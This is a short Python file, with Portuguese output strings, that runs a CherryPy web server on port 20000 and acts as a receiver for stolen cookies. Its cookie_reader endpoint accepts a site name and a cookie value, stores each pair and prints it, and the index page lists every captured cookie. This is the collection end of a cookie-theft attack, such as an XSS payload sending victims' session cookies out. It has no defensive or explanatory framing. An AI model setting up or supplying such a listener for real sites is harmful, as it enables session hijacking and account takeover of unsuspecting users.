import os.path
import cherrypy


baseDir = os.path.abspath(os.path.dirname(__file__))

cookies_list = []

class Root(object):
    @cherrypy.expose
    def index(self):
        print ("Servidor que imprime o que receber.")
        return_str = ''
        for tuplo in cookies_list:
            return_str+="Site: {}\t\t\t\t;{}Cookie: {}{}".format(tuplo[0],"\t\t\t",tuplo[1],"\n")
        return return_str

    @cherrypy.expose
    def cookie_reader(self, site, cookie):
        print("\n\n\nCookies recebidas:")
        cookies_list.append((site, cookie))
        for tuplo in cookies_list:
            print("Site:", tuplo[0], "             Cookie:", tuplo[1])
        print("\n\n\n")


cherrypy.config.update({'server.socket_port': 20000})
cherrypy.quickstart(Root(), "/")
        

